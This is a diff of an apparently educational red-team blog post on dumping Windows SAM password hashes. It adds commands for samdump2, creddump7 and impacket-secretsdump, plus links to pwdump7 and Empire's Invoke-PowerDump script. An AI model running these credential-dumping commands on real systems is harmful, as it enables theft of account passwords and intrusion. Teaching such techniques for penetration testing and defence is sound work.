@@ -1,5 +1,5 @@
 ---
-title:  "Windows Credentials-SAM Database part-1"
+title:  "Windows Credentials part-1 SAM Database"
 classes: wide
 header:
   teaser: /img/redteampng.png
@@ -77,9 +77,36 @@ reg save HKLM\system C:\users\nored0x\Desktop\system
 <img src="/img/cred1/7.PNG" alt="Getting-gz" width="800" height="200"> 
 
 
+## samdump2
+```
+samdump2 SYSTEM SAM 
+```
+
+<img src="/img/cred1/t1.PNG" alt="Getting-gz" width="800" height="200"> 
+
+## pwdump7
+ This tool extracts the SAM file from the system and dumps its credentials
+
+download :https://www.tarasco.org/security/pwdump_7/pwdump7.zip
+
+<img src="/img/cred1/t1.PNG" alt="Getting-gz" width="800" height="200"> 
 
 
-
+```
+https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1
+```
+## creddump7
+```
+sudo apt install python-crypto
+sudo git clone https://github.com/Neohapsis/creddump7
+python pwdump.py /home/kali/system /home/kali/sam
+```
+    
+    
+## impacket
+```
+impacket-secretsdump -system SYSTEM -sam SAM local
+```
 
 ## Decrypting Hash
 John The Ripper
